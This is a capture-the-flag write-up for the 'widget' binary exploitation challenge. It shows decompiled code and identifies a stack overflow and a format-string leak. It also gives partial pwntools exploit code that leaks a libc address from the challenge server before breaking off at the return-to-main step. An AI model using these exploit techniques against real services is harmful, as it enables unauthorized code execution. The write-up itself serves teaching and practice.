# widget

## Description

> I seem to have lost my gadgets.
>
> `nc challs.actf.co 31320`

{% file src="../../../.gitbook/assets/Dockerfile" %}

{% file src="../../../.gitbook/assets/widget" %}

## Solution

This solution is overcomplicated in order to get RCE.\
There are simpler solutions that just jumps to win() to print the flag.

### TL;DR

* Leak libc address with printf
* Return to main, caring for RBP value
* Perform ret2libc, using one\_gadget for RCE

### Initial Analysis

Decompiling the `widget` binary in ghidra, there are 2 functions of interest, `main` and `win`.

{% tabs %}
{% tab title="main()" %}
```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  local_10 = getegid();
  setresgid(local_10,local_10,local_10);
  if (called != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  called = 1;
  printf("Amount: ");
  local_2c = 0;
  __isoc99_scanf("%d",&local_2c);
  getchar();
  if (local_2c < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Contents: ");
  read(0,local_28,(long)local_2c);
  local_c = 0;
  while( true ) {
    if (local_2c <= (int)local_c) {
      printf("Your input: ");
      printf(local_28);
      return;
    }
    if (local_28[(int)local_c] == 'n') break;
    local_c = local_c + 1;
  }
  printf("bad %d\n",(ulong)local_c);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
{% endtab %}

{% tab title="win()" %}
```c
void win(char *param_1,char *param_2)

{
  int iVar1;
  char local_98 [136];
  FILE *local_10;
  
  iVar1 = strncmp(param_1,"14571414c5d9fe9ed0698ef21065d8a6",0x20);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = strncmp(param_2,"willy_wonka_widget_factory",0x1a);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Error: missing flag.txt.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_98,0x80,local_10);
  puts(local_98);
  return;
}
```
{% endtab %}
{% endtabs %}

At first glance, we can determine that the author wants us to overwrite **RIP** to return to the `win` function and find suitable gadgets to input the proper arguments into the `win` function in order to print the flag.

Since there is a lack of gadgets, I instead, took the laborious approach of using `libc` to gain RCE.

### Finding Vulnerabilities

In the `main` function, we can see there are 2 obvious vulnerabilities:

#### Stack overflow

You can input any amount of characters into a buffer of 24 bytes.

```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  ...
  
  printf("Amount: ");
  local_2c = 0;
  __isoc99_scanf("%d",&local_2c);
  getchar();
  if (local_2c < 0) {
    exit(1);
  }
  printf("Contents: ");
  read(0,local_28,(long)local_2c);
  
  ...
}
```

#### Format String Vulnerability (printf)

The `printf` function is performed on the user input, but it checks for the 'n' character.\
This means that we can only leak the stack; we can't perform arbitrary write with `printf`. (you can but you would have to overwrite the `local_c` variable, that's another method that I will not go through)

```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  ...
  
  printf("Contents: ");
  read(0,local_28,(long)local_2c);
  local_c = 0;
  while( true ) {
    if (local_2c <= (int)local_c) {
      printf("Your input: ");
      printf(local_28);
      return;
    }
    if (local_28[(int)local_c] == 'n') break;
    local_c = local_c + 1;
  }
  printf("bad %d\n",(ulong)local_c);
  exit(1);
}
```

### Leaking Addresses With printf

We first create a template to work with the binary using pwntools.

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget_patched",checksec=False)
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)
    
payload = "test"

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.interactive()
p.close()
```

Using `gdb`, we can find that the offset to overwrite RIP is **40** bytes, so our RBP value is at **32** bytes (8 bytes for 64-bit binary).

We first need to find a helpful address to leak.\
We can do this using `gdb`, by setting a breakpoint at the `ret` of main and sending the content as %\<int>$p (where \<int> is a positive integer).

For the initial leak, we want to find any value that we can distinguish on the stack, so we try different \<int> until we get a suitable value.

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>break at ret</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>leaked value</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>stack values</p></figcaption></figure>

As seen in the images, we sent **%19$p** and the return value is at the **0x6** offset on the stack.

We want a libc address and we see one at offset **0x14**, so we can just calculate the offset we need to leak that address:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>offset calculation</p></figcaption></figure>

Trying for %33$p indeed returns the address we need.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>leaked libc address</p></figcaption></figure>

<details>

<summary>current code</summary>

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget",checksec=False)
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)
    
padding = b'A'*32

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += b'B'*8 # rbp here is needed

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
print("Leaked:",hex(leak))

p.interactive()
p.close()
```

</details>

### Returning to main

Now we have a libc leak, we need to return to `main` so that we can overwrite RIP again. However, the `called` global variable of the program is already set and checked before running main again, so we can't just return to `main` directly.

```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  ...

  if (called != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  called = 1;

  ...
}
```

